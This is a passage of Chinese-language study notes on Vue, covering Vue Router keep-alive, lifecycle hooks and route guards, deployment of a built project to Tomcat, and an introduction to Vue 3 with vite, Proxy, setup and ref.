            a3: this.sjz[2],
        },
    },
    () => {
        console.log(1);
    },
    () => {
        console.log(2);
    }
);
```

当多次点击石家庄按钮的时候，可以发现，第一个函数是成功的回调函数，第二个函数是失败的回调函数：

![image-20240503104917062](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031049499.png)

## 路由组件的销毁

默认情况下，路由组件是在什么时候被销毁的。

在 HeBei 组件中，给每个市前面加一个复选框，然后测试当勾选了复选框后，切到 HeNan 组件去，再切换回来后，，选中的复选框是否依旧被勾选：

![image-20240503105518063](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031055477.png)

切换到 HeNan 组件再切回 HeBei 组件时，发现状态没有了：
![image-20240503105613477](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031056890.png)

因为原先的那个组件被销毁了。

所以默认的情况下，只要进行了路由的切换，原先的那个组件就一定会被销毁。

可以在 HeBei 组件上通过 destroyed 钩子函数查看是否被销毁了：

```js
destroyed() {
    console.log("被销毁了");
},
```

在点击河北省后，再点击河南省的时候，HeBei 这个组件就被销毁了

![image-20240503105841471](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031058913.png)

所以现在有个需求，就是切换路由的时候，保留住原先那个组件。

这个要去 App 组件中，找到那个 router-view，HeBei 和 HeNan 组件切来切去就是在这个地方，可以将这个 router-view 标签加在一个 keep-alive 标签中，这样这个 router-view 上所有的组件切换都不会被杀死：

```vue
<keep-alive>
    <router-view></router-view>
</keep-alive>
```

也可以指定某个组件在切换的时候不被销毁，在 keep-alive 上使用 include 属性指定组件的名称：

```vue
<keep-alive include="HeBei">
    <router-view></router-view>
</keep-alive>
```

+ 这个组件的名字就是组件导出时指定的 name
+ include="HeBei" 表示切换组件时，HeBei 这个组件不被销毁

也可以指定多个组件名称，需要使用数组：

```vue
<keep-alive :include="['HeBei', 'HeNan']">
    <router-view></router-view>
</keep-alive>
```

## 路由组件的两个钩子

对于普通组件来说，生命周期中有 8 个钩子函数；

对于路由组件来书，除了普通组件的 8 个，还有两个：

+ activated：在路由组件被激活的时候执行
+ deactivated：在路由组件被切走的时候被执行

![image-20240503113453559](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031134981.png)

当点击河北省的时候，就会激活 HeBei 组件，HeBei 组件中的 activated 钩子函数就会执行；当此时点击河南省的话，HeBei 组件会被切换，就会触发 HeBei 组件的 deactivated 钩子函数，而 HeNan 组件的 activated 钩子会被触发。

现在有个需求，点击河北省后，显示出市的信息的同时，有一个定时器，每隔一秒打印一次信息。

在 HeBei 组件的 mounted 钩子函数中可以实现这个功能：

```js
mounted() {
    this.timer = setInterval(() => {
        console.log("这是一个定时器");
    }, 1000)
},  
```

+ 这个 setInterval 会有一个返回值，删除这个计时器的时候需要用到这个返回值

那什么时候应该解除掉这个定时器，应该在组件销毁之前解除：

```js
beforeDestroy() {
    clearInterval(this.timer)
    console.log("删除了计时器");
},  
```

但是因为为了在切换路由组件的时候，保留路由组件的状态，使用了 keep-alive 标签，所以路由组件在切换的时候不会被销毁，也就是说上面这个删除计时器的代码永远不会执行。

所以这个时候就要用到 activated 和 deactivated 这两个钩子函数：

```js
activated() {
    console.log("激活了");
},
deactivated() {
    clearInterval(this.timer)
    console.log("删除了计时器");
},
```

![image-20240503125825435](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031258897.png)

 总结：对于普通组件来说，钩子函数有 9 个，生命周期中的 8 个 + nextTick(function(){})，这个 nextTick 中的回调函数会在下一次 dom 渲染的时候执行；

对于路由组件来说，钩子函数有 11 个，上面的 9 个 + activated + deactivated。

## 路由守卫

保护路由安全的一种机制。

还是以上的程序，现在有个需求，只有登录用户是 admin 的时候，才能访问石家庄和邯郸。其实就是权限的问题。

所以在切换到 ShiJiaZhuang 组件之前，应该写一段代码来鉴权。

![image-20240503132423376](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031324805.png)

那这段鉴权代码写在哪里？可以写在路由守卫上。

不同的守卫就相当于在不同的时机、不同的位置添加代码。

### 全局前置守卫

全局前置守卫的代码写在 router/index.js 中，在创建出路由器对象后、暴露之前的位置。

怎么写？

```js
router.beforeEach(callback)
```

这个 beforeEach 中的 callback 什么时候调用呢？在初始化的时候调用一次，以后每一次在切换任意路由组件之前都会被调用。这个 callback 可以是普通函数，也可以是箭头函数。

callback 有三个参数：

+ from：from 是一个路由对象，表示从哪个路由来
+ to：to 也是一个路由对象，表示到哪个路由去
+ next：next 是一个函数，调用这个函数过后，表示放行，可以继续往下走

```js
router.beforeEach((to, from, next) => {
    console.log(111);
})
```

可以看到此时初始化会调用一次，点击链接打算切换路由组件又会调用一次：

![image-20240503133554481](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031335918.png)

但是页面并没有显示路由组件出来，这是因为 next 函数没有调用，调用 next 函数就会显示出路由组件：

```js
router.beforeEach((to, from, next) => {
    next()
})
```

可以打印出 from、to、next 查看一下，这是初始化的时候：

![image-20240503134114026](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031341467.png)

显然，初始化时，from 和 to 是一样的。点击一次河北省后，from 对象还是根路径，to 对象就是 /hebei 了：

![image-20240503134516211](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031345654.png)

那么就可以实现这个功能了，当登录用户不是 admin 时，不能访问石家庄和邯郸的数据：

```js
router.beforeEach((to, from, next) => {
    let loginame = "zs";
    if (to.name === "shi" || to.name === "han") {
        if (loginame != "admin") alert("你没有权限访问！");
        else next();
    } else next();
});
```

![image-20240503135001277](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031350719.png)

这样可以达到效果，但是如果需要鉴权的路由有很多，像这样写的发就会很麻烦，很冗余。

可以给需要鉴权的路由一个自定义的属性，赋值为 true，不需要鉴权的路由就不用加这个属性。但是不能随便给路由添加属性，如果想给路由添加自定义属性，需要借助路由对象原来的 meta（路由元）属性：

```js
{
    path: "/hebei",
    component: HeBei,
    children: [
        {
            name: "shi",
            path: "sjz/:a1/:a2/:a3",
            component: City,
            props: true,
            meta: { isAuth: true },
        },
        {
            name: "han",
            path: "hd/:a1/:a2/:a3",
            component: City,
            props: true,
            meta: { isAuth: true },
        },
    ],
},
```

+ 要想给路由对象自定义属性，必须把自定义属性写在 meta 对象中。
+ 自定义的属性不写在 meta 中的话，通过路由对象是访问不到的。

那么路由守卫就可以这样写了，只需要判断路由对象上的 isAuth 属性即可：

```js
router.beforeEach((to, from, next) => {
    let loginame = "zs";
    if (to.meta.isAuth && loginame != "admin") alert("你没有权限访问");
    else next();
});
```

此时，还想将项目改进一下，比如这个页面的 title：

![image-20240503140158889](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031401366.png)

想让这个 title 会根据我的点击内容去变化，比如，点击河北省，就显示河北省，点击石家庄就显示石家庄。

直接通过 js 操作 document.title 就可以修改页面的标题，那么首先要个路由设置一个标题，同样是自定属性，需要在 meta 对象中定义：

```js
routes: [
    {
        path: "/hebei",
        component: HeBei,
        meta: { title: "河北省" },
        children: [
            {
                name: "shi",
                path: "sjz/:a1/:a2/:a3",
                component: City,
                props: true,
                meta: { isAuth: true, title: "石家庄" },
                a: true,
            },
            {
                name: "han",
                path: "hd/:a1/:a2/:a3",
                component: City,
                props: true,
                meta: { isAuth: true, title: "邯郸" },
            },
        ],
    },
    {
        path: "/henan",
        component: HeNan,
        meta: { title: "河南省" },
    },
],
```

然后在前置守卫中，执行 next 之后修改页面的标题：

```js
router.beforeEach((to, from, next) => {
    let loginame = "admin";
    if (to.meta.isAuth && loginame != "admin") alert("你没有权限访问");
    else {
        next();
        document.title = to.meta.title;  // 修改标题
    }
});
```

+ 注意，不要将修改标题的代码放在前置守卫的最前面，因为这样的话，可能不能执行到 next ，但是也会改掉页面名字

![image-20240503141414157](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031414606.png)

### 全局后置守卫

全局后置守卫的代码也写在创建路由器对象之后，暴露路由器对象之前。

```js
router.afterEach((to, from) => {

})
```

+ 这个回调函数可以是普通函数，也可以是箭头函数
+ 这个回调函数只有两个参数，和前置守卫相比，没有 next 函数，to 和 from 对象都是一样的

那么这个后置的守卫的回调函数在什么时候调用呢？初始化的时候调用一次，在以后每次切换完任意一个路由组件之后被调用。

所以以上改变页面 title 的代码写在全局后置守卫中可以更简单实现：

```js
router.afterEach((to, from) => {
    document.title = to.meta.title;
})
```

他和全局前置守卫不同的地方就是在于执行的时机不同。

那么现在还有一个问题，当初始化的话，页面的 title 是 undefined：

![image-20240503142632907](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031426357.png)

这是因为初始化的时候，to 这个对象是 `/` 根路径的路由对象，没有 meta.title 这个属性，所以是 undefined，所以可以这样写：

```js
router.afterEach((to, from) => {
    document.title = to.meta.title || "欢迎";
});
```

+ 如果 to.meta.title 是 undefined，转为布尔值就是 false

![image-20240503142954057](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031429497.png)

其实还有点小问题，就是在页面中使劲刷新的时候，页面的标题会出现“闪现”的问题，因为它会先显示原来的项目名称，然后才会显示“欢迎”，那么这个原来的项目名称其实是 public/index.html 中的 title：

```html
<title><%= htmlWebpackPlugin.options.title %></title>
```

这个 title 的值取自 package.json 中的 name：

![image-20240503143302742](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031433199.png)

所以可以将 index.html 中的标题改了即可。

### 局部path守卫

以上的全局路由守卫的全局体现在：任意路由组件切换时都会执行。

那这就可能有个效率问题，假如有 100 个路由组件，只需要对一个路由进行守卫，但是用了全局的守卫，那么这 100 个路由组件切换时都会执行一遍守卫，而实际上只需要在那个需要守卫的组件切换时才执行。

所以就需要用到局部路由守卫（path 守卫、component 守卫）。

这个局部路由守卫之 path 守卫的代码写在路由对象中，比如，在以上的程序中，现在只需要对石家庄这个路由进行守卫：

```json
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props: true,
    meta: { isAuth: true, title: "石家庄" },
    // 局部路由
    beforeEnter(to, from, next) {
        
    },
},
```

+ beforeEnter 的三个参数同上
+ 注意：没有 afterEnter 函数

那这个 beforeEnter 什么时候被调用？进入“shi”这个路由前被调用。

那么通过这个 path 守卫来鉴权的话就这样写：

```json
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props: true,
    meta: { title: "石家庄" },
    beforeEnter(to, from, next) {
        let loginame = "zs";
        if (loginame != "admin") alert("你没有权限！");
        else next();
    },
},
```

+ 就不需要在 meta 中定义一个属性来判断是否需要鉴权了，写了 beforeEnter 就一定会执行的

### 局部component守卫

也叫路由组件守卫。

component 守卫的代码是写在组件中的：

```js
export default {
    name: "City",
    props: ["a1", "a2", "a3"],
    beforeRouteEnter(to, from, next) {
        
    },
    beforeRouteLeave(to, from, next) {
        
    },
};
```

beforeRouteEnter 的执行时机是：进入路由组件之前。

beforeRouteLeave 的执行时机是：离开路由组件之前。

普通组件不会触发，只有路由组件（在路由中配置过的组件）才会触发。

比如，现在点击石家庄按钮，和全局的前置后置守卫的区别是：

+ 全局前置后置守卫都会执行
+ beforeRouteEnter 会执行
+ beforeRouteLeave 不会执行，只会在点击另一个链接时，要切换路由组件时执行

beforeRouteEnter 中的 to 和 beforeRouteLeave 中的 from 是同一个对象：

```js
export default {
    name: "City",
    props: ["a1", "a2", "a3"],
    beforeRouteEnter(to, from, next) {
        console.log(`进入之前的组件：${to.meta.title}`);
        next();
    },
    beforeRouteLeave(to, from, next) {
        console.log(`离开之前的组件：${from.meta.title}`);
        next();
    },
};
```

![image-20240503145953708](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031459186.png)

# 上线前端项目

当前所写的源代码 xxx.vue 对于浏览器来说不认识，需要使用项目构建工具完成打包编译，比如可以使用 webpack 来打包编译。

## 关于浏览器向服务器发送请求时的路径问题

路由的两种路径模式：

+ hash 模式
+ history 模式

路径中如果带有 `#` 字符，那么这个路径就是 hash 模式，默认就是 hash 模式。路径中 `#` 后面的部分称为 hash，这个 hash 不会作为路径的一部分发送给服务器。

比如路径：http://localhost:8080/#/hebei/sjz/长安区3/裕华区2/新华区2，真实的路径就是 http://localhost:8080/，可以在开发者工具中的 network 中查看到：

![image-20240503150751012](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031507494.png)

如果想去掉路径中这个 `#` ，就可以启用 history 模式。如果没有这个 `#` 就是 history 模式。

在 router/index.js 中创建 router 对象的时候添加一个配置项：

```js
const router = new VueRouter({
    mode: "history",  // history 模式
    routes: []
})
```

+ 不写 mode 默认就是 hash 模式

这个时候路径中就没有了 `#`，直接从地址栏访问这个路径并查看控制台：

![image-20240503151410098](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031514592.png)

如果是使用 history 上线项目的话，会出问题。

## 打包编译项目

当前使用的是 history 模式。

需要将项目打包、编译，怎么打包编译？

打开 package.json ：

![image-20240503151649116](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031516582.png)

之前运行项目一直使用的是 serve 命令，现在使用这个 build 命令来打包编译：

```
npm run build
```

这个命令在执行过程中，可以观察项目结构，会多出一个 dist 文件夹：

![image-20240503151918044](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031519521.png)

这个 dist 文件夹下的东西就是我们的项目打包编译后的成品，就可以放到服务器上让客户去访问了。

## 搭建服务器

使用 java 搭建一个 java 的服务器。然后将 dist 中的东西放到 java 服务器中。

环境搭建：

+ 下载 JDK、安装 JDK、配置环境变量 JAVA_HOME=jdk 根
+ 下载 Tomcat、解压 Tomcat、配置环境变量 CATALINA_HOME = Tomcat 的根
+ 配置环境变量 Path = %CATALINA_HOME%\bin

接下来启动 tomcat。打开 dos 窗口，输入 startup.bat 回车，启动的时候会报错：

![image-20240503154157662](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031541281.png)

这是因为 Vue CLI 内置的服务器端口是 8080，此时项目正在运行中，占用着 8080 端口，而 Tomcat 服务器默认占用的端口也是 8080，所以启动不了。两个解决办法：

+ 停掉当前正在运行的 vue 项目
+ 改变 tomcat 服务器的端口

直接停掉当前 vue 项目，然后重新启动 tomcat，启动成功：

![image-20240503154501731](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031545287.png)

如果 dos 窗口中中文显示乱码的话，找到 tomcat 目录下 conf 里的 logging.properties 文件，打开后将以下代码中的 UTF-8 改为 GBK，因为 dos 窗口默认是 gbk 编码：

![image-20240503154733970](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031547449.png)

此时，Java 服务器就已经搭建完了。

## 发布到服务器上

打开打包生成的 dist 文件夹，将里面的内容全部复制下来，然后将 tomcat 目录下的 webapps/ROOT 下的所有东西删除不要，然后将 dist 中的东西粘贴到这里就可以了

![image-20240503155237436](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031552946.png)

然后启动 tomcat 服务器就可以访问了：http://localhost:8080

![image-20240503155753258](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031557791.png)

## 使用history模式发布的问题

此时是 history 模式下打包的，正常点击没有问题，但是刷新一下页面后：

![image-20240503155857249](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031558734.png)

因为刷新的时候会将地址栏中的整个路径发送个服务器，而服务器中并没有这个路径对应的资源，所以会报 404。

如果是将项目的路由模式改为 hash 试一下：

![image-20240503160037551](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031600030.png)

停掉 tomcat 服务器，重新打包编译，重新部署到 tomcat 服务器下，然后重启 tomcat，重新访问 http://localhost:8080：

![image-20240503160220562](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031602054.png)

此时页面不管怎么刷新都不会报 404 错误，因为 `#` 后面的部分叫做 hash 值，在刷新的时候不会被当成路径提交给服务器，所以刷新时提交给服务器的路径还是 http://localhost:8080；但是没有 `#` 的话，就是 history 模式，每次刷新就会将整个路径全部提交给服务器。

那我们既要使用 history 的模式，又要解决刷新页面不报 404 ，这就需要后端开发人员了。

在部署项目的根路径 ROOT 下新建一个文件夹 WEB-INF，然后可以去 tomcat 下的 webapps 下的其他目录中的 WEB-INF 下拷贝一份 web.xml 文件放到 ROOT 下的 WEB-INF 下，然后打开这个 web.xml 文件，只需要修改成以下代码：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="https://jakarta.ee/xml/ns/jakartaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="https://jakarta.ee/xml/ns/jakartaee
                      https://jakarta.ee/xml/ns/jakartaee/web-app_6_0.xsd"
  version="6.0"
  metadata-complete="true">

  <error-page>
	<error-code>404</error-code>
	<location>/index.html</location>
  </error-page>
</web-app>
```

+ 就是当发生 404 错误的时候，地址变成 /index.html

然后停掉服务器，把项目模式改为 history，重新打包编译部署，再启动 tomcat，重新访问，再刷新就没问题了。

# Vue3

## 了解

vue3 官网地址：https://cn.vuejs.org/

版本迭代历史：https://github.com/vuejs/core/releases

vue3 做了哪些改动

+ 最核心的虚拟DOM算法进行了重写
+ 支持 tree shaking：在前端的性能优化中，es6 推出了 tree shaking 机制，tree shaking 就是当我们在项目中引入其他模块时，他会自动将我们用不到的代码，或者永远不会执行的代码摇掉
+ 最核心的响应式由 Object.defineProperty 修改为 Proxy 实现
+ 更好的支持 TS（Type Script：TypeScript 是微软开发的一个开源的编程语言，通过在 JavaScript 的基础上添加静态类型定义构建而成。TypeScript 通过 TypeScript 编译器或 Babel 转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。）
+ ……

vue3 比 vue2 好在哪：与 Vue 2相比，Vue 3 在捆绑包大小（通过树抖动可轻 41%）、初始渲染（快 55%）、更新（快 133%）和内存使用（少 54%）方面都有了显著的性能改进

Vue 3 的新特性：

+ 新的生命周期钩子

  ![image-20240503163101335](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031631805.png)

+ 键盘事件不再支持 keyCode。例如：v-on:keyup.enter 支持，v-on:keyup.13 不支持

+ 组合式 API（Composition API）

+ 新增了一些内置组件

+ data 必须是一个函数

+ ……

## 创建vue3工程

vue2 工程是通过 vue-cli 创建的，vue-cli 脚手架是基于 webpack 项目构建工具实现的。

vue3 也可以通过 vue-cli 创建，但目前更加流行的方式是采用 create-vue 脚手架来完成 vue3 工程的创建。

create-vue 这个脚手架是基于 vite 项目构建工具来实现的，vite 和 webpack 一样，都是项目构建工具。

vite 的特点：服务器启动非常快，代码修改之后更非常快，这是使用 vite 的主要原因。vite 比 webpack 的性能要好很多。

### 使用vue-cli创建

创建 Vue3 版本的工程，要求 vue-cli 最低版本 4.5.0，可以使用以下命令升级你的脚手架版本：

```
npm install -g @vue-cli
```

在一个舒服的目录下创建：

```
D:\MyCode\Vue>vue create zsm_vue3_cli
```

选择 Vue3 的版本：

![image-20240503164316987](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031643467.png)

创建完后，打开，和 vue2 的项目结构差不多：

![image-20240503164546128](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031645609.png)

不一样的是 main.js 这个入口程序，这是符合 vue3 的入口程序：

```js
import { createApp } from 'vue'
import App from './App.vue'

createApp(App).mount('#app')
```

然后启动命令一样：

```
npm run serve
```

启动后界面和 vue2 一样。

### 认识vue3工程

当前这个 vue3 的工程是基于 vue-cli 创建的。

在入口文件 main.js 中：

```js
import { createApp } from 'vue'
import App from './App.vue'

createApp(App).mount('#app')

// vue2入口文件：
/*
import Vue from 'vue'
import App from './App.vue'

new Vue({
   el: '#app',
   render: h => h(App),
})
*/
```

在 Vue3 当中，不再引入 Vue 了，引入了一个 createApp 函数，这个函数可以创建 app 对象，以上代码的注释：

```js
// 在Vue3当中，不再引入Vue了，引入了一个createApp函数，这个函数可以创建app对象。
import { createApp } from 'vue'

// 引入了一个根组件App
import App from './App.vue'

// 这行代码表示创建了一个app对象
// 这个app对象类似于Vue2当中的vm。
// app和vm的区别是：app更加轻量级。(app上的属性更少一些)
const app = createApp(App)

// 将app挂载到指定位置
app.mount('#app')
```

这里的 mount 方法是挂载，还有一个 unmount 方法是卸载，比如 3 秒后卸载：

```js
setTimeout(() => {
    app.unmount('#app')
}, 3000)
```

在 Vue3 当中 <template> 标签中可以有多个根标签了。不需要只有一个根标签。在 App.vue 中：

![image-20240503170104037](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031701550.png)

## create-vue创建vue3

create-vue 也是一个脚手架，

vue-cli 是创建 webpack+vue 项目的脚手架工具；

create-vue 是创建 vite+vue 项目的脚手架工具

webpack和vite都是前端的构建工具。

### 了解vite

vite 官网：https://vitejs.cn/

vite 是什么？（vite 被翻译为：快）

vite 是一个构建工具，作者尤雨溪。

前端构建工具有哪些？

![image-20240503170731856](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031707400.png)

vite 比 webpack 好在哪里？

+ 第一：服务器启动速度快。
+ 第二：更新快。

### 创建vue3工程

官方指导：https://cn.vuejs.org/guide/quick-start.html

安装 create-vue 脚手架并创建 vue3 项目：

```
npm init vue@latest
```

+ 如果你已经安装了 create-vue 脚手架，也不需要担心，还是采用这种方式创建 vue3 的工程。

+ 如果没有安装 create-vue 脚手架，会提醒你安装：

  ![image-20240503171614099](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031716627.png)

  安装好后，提示输入项目名字，输入了名字后，一路直接回车选否即可：

  ![image-20240503171841476](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031718040.png)

安装好后，切换到项目的根目录下，执行：

```
npm install
```

然后改项目就创建好了，可以打开 package.json 中查看：

![image-20240503172358652](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031723202.png)

启动项目：

```
npm run dev
```

默认页面：

![image-20240503172420389](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031724981.png)

### 认识工程结构

![image-20240503172444075](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031724594.png)

使用 vite 创建的工程和 webpack 创建的工程有何不同？

+ index.html 放在了 public 的外面。没有在 public 当中了。vite 以 index.html 作为入口，不再用 main.js 作为入口了。在 index.html 中找 main.js：

  ![image-20240503172617543](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031726077.png)

+ 对于 vite 构建工具来说，配置文件是：vite.config.js

  vite.config.js 类似于之前 webpack 当中的：vue.config.js

  也就是说如果配置代理的话，需要在 vite.config.js 文件中完成配置。

+ vite.config.js 配置文件的说明在哪里？https://cn.vitejs.dev/config/

+ 启动的端口号也不一样了，不是8080了。

+ vite启动快，更新快。

## Proxy实现原理

Vue2 的响应式核心：Object.defineProperty

Vue3 的响应式核心：Proxy

### 回顾vue2响应式

Object.defineProperty 这种方式只能对修改(set)和读取(get)进行拦截。所以当给对象新增一个属性，或者删除对象的某个属性时，不会经过 set 和 get，导致无法实现响应式。并且通过数组下标去修改数组中的数据，也不会实现响应式处理。

比如，创建一个 user1 对象和一个 user2 对象：

```js
// 创建一个user1对象
let user1 = {
    name : 'jack'
}

// 创建一个user2对象
let user2 = {}
```

以后给 user2 来扩展一个 name 属性，通过 user2 的那么来访问 user1 的 name：

```js
// 给user2扩展一个属性name
Object.defineProperty(user2, 'name', {
    // 数据代理
    get(){
        console.log('get方法执行了。')
        return user1.name
    },
    // 数据劫持
    set(value){
        // 改数据
        user1.name = value
        // 同时在这里可以进行响应式处理，更新页面
        console.log('这里进行响应式处理，页面已经更新.')
    }
})
```

此时 user1 中的 name 属性不是响应式的，user2 中的 name 属性是响应式的：

![image-20240503174615527](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031746065.png)

但是会有问题，给对象新增属性时无法响应式：

![image-20240503174736101](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031747670.png)

### ES6新特性：window.Proxy对象

通过 Proxy 可以创建一个代理对象：

```js
let proxyObj = new Proxy(targetObj, {
    get(target, propertyName){
        return target[propertyName]
    },
    set(target, propertyName, value){
        target[propertyName] = value
    },
    deleteProperty(target, propertyName){
        return delete target[propertyName]
    }
})
```

代理模式的原理：通过代理对象去完成目标对象的任务，同时还可以额外新增一些程序：

```js
// 目标对象
let user = {
    name : 'jack'
}

// 通过Proxy来生成代理对象
let userProxy = new Proxy(user, {
    // 当你读取的时候，get执行。
    get(){},
    // 当你修改某个属性的时候，或者新增某个属性的时候，set执行。
    set(value){},
    // 当你删除某个属性的时候，deleteProperty就会执行
    deleteProperty(){}
})
```

+ 主要是通过创建 Proxy 时传的配置项来完成响应式处理的。

配置项中的这三个方法都是有参数的：

```js
let userProxy = new Proxy(user, {
    get(target, propertyName){},
    set(target, propertyName, value){},
    deleteProperty(target, propertyName){}
})
```

+ target 参数是代表目标对象。
+ propertyName 参数代表的是目标对象上的属性名，是一个字符串
+ set 方法的 value 属性是具体赋的值

访问一下 get 方法：

```js
let userProxy = new Proxy(user, {
    get(target, propertyName) {
        console.log('target：', target);
        console.log('propertyName：', propertyName);
    },
    set(target, propertyName, value) {},
    deleteProperty(target, propertyName) {},
});
```

![image-20240503180411543](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031804099.png)

可以看到 target 就是目标对象，propertyName 就是访问的属性名，这个 undefined 是最后这个 userProxy 的 get 方法的返回值，所以 userProxy.name 的值是取决于 get 的返回值，而 propertyName 刚好是一个字符串，，target 刚好是一个对象，所以直接返回目标对象的对应属性：

```js
let userProxy = new Proxy(user, {
    get(target, propertyName) {
        console.log('target：', target);
        console.log('propertyName：', propertyName);
        return target[propertyName]
    },
    set(target, propertyName, value) {},
    deleteProperty(target, propertyName) {},
});
```

![image-20240503180710875](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031807453.png)

那么 set 和 deleteProperty 方法的写法：

```js
let userProxy = new Proxy(user, {
    get(target, propertyName) {
        return target[propertyName];
    },
    set(target, propertyName, value) {
        target[propertyName] = value;
    },
    deleteProperty(target, propertyName) {
        delete target[propertyName];
    },
});
```

那么现在这三个方法中添加一条输出语句，看看是否响应式：

![image-20240503181402986](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031814602.png)

注意这里执行了删除后，返回了一个 false，这是因为要在 deleteProperty 方法中将删除的结果返回，不返回的话就是 undefined，那就是 false：

```js
deleteProperty(target, propertyName) {
    console.log("删除了");
    return delete target[propertyName];
},
```

### 反射机制Reflect对象

vue3 当中在使用 Proxy 对象完成响应式处理的时候，和我们写的代码有些不同，Vue3 框架底层实际上使用了 ES6 的 Reflect 对象来完成对象属性的访问：

![image-20240503181949166](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031819724.png)

## setup

setup 是一个函数，vue3 中新增的配置项。

setup 函数的返回值：

+ 返回一个对象，该对象的属性、方法等均可以在模板语法中使用，例如插值语法、
+ 返回一个渲染函数，从而执行渲染函数，渲染页面

组件中所用到的 data、methods、computed、watch、生命周期钩子....等，都要配置到 setup 中。如果将这些还是配置到了 setup 外的话，表示还是使用了 vue2 的规则（可以用，不建议用）。

那么在 setup 中如何定义数据，并使用：

```vue
<template>
    <h2>姓名：{{ name }}</h2>
    <h2>年龄：{{ age }}</h2>
    <button @click="sayHi">SAY HI</button>
</template>

<script>
export default {
    name: "App",
    setup() {
        let name = "zhansan";
        let age = 50;
        function sayHi() {
            alert("Hi");
        }

        return {
            name,
            age,
            sayHi,
        };
    },
};
</script>
```

+ 在 setup 函数体中定义的变量就相当于之前的 data 中的数据，但是需要封装成一个对象返回才能使用这些数据

+ 在 setup 函数体中定义的方法就相当于之前的 methods 中的方法，也需要封装成对象返回才能使用

+ setup 中定义的方法可以直接使用 setup 中定义的变量

  ```js
  function sayHi() {
      alert(name,age);
  }
  ```

  + 另外，在 setup 函数体中定义函数一定不能少了 function 关键字


![image-20240503201742288](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032018950.png)

**在 setup 中没有 this**，输出 this 会得到一个 undefined。

setup 还可以返回一个渲染函数，要先导入一个渲染函数，然后再返回这个渲染函数：

```js
import { h } from "vue";

export default {
    name: "App",
    setup() {
        return function () {
            return h("h1", "hhhhhhhhh");
        };
    },
};
```

返回的渲染函数会将 template 模板全部覆盖。渲染函数第一个参数是标签名，第二个参数是标签内容：

![image-20240503204122842](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032041151.png)

简写：

```js
return () => h("h1", "hhhhhh");
```

## ref函数实现数据响应式

上面在 setup 中定义的数据具有响应式吗？测试一下：

```vue
<template>
    <h2>姓名：{{ name }}</h2>
    <h2>年龄：{{ age }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
export default {
    name: "App",
    setup() {
        let name = "zhansan";
        let age = 50;
        function modify() {
            name = "lisi";
            age = 60;
            console.log(1111);
        }
        return {
            name,
            age,
            modify,
        };
    },
};
</script>
```

方法执行了，变量被修改了，但是页面没有修改：

![image-20240503204821897](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032048216.png)

说明这样没有响应式。

vue2 时的写法：

```js
export default {
    name: "App",
    data() {
        return {
            name: "lisi",
        };
    },
    methods: {
        modify() {
            this.name = "zhangsan";
        },
    },
};
```

这是因为在 modify 中修改时，是走的 vc 中的属性 name 去修改 data 中的 name 属性，是有一个中间代理存在的，所以有机会做响应式处理。而 vue3 这个代码中修改数据时，根本没有经过中间代理，没有机会去做响应式处理。

vue3 要做响应式，需要使用到 ref 函数，ref 是 vue3 内置的一个函数。

要先引入 ref 函数，然后使用 ref 函数创建数据：

```js
import { ref } from "vue";

export default {
    name: "App",
    setup() {
        let name = ref("张三");
        let age = ref("520");
        console.log(name);
    },
};
```

+ ref 对“张三”这个数据进行包裹，然后返回了一个全新的对象：引用对象

![image-20240503210755914](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032107283.png)

这个 RefImpl 是 reference implement，引用的实现的实例对象，或者就叫引用对象。

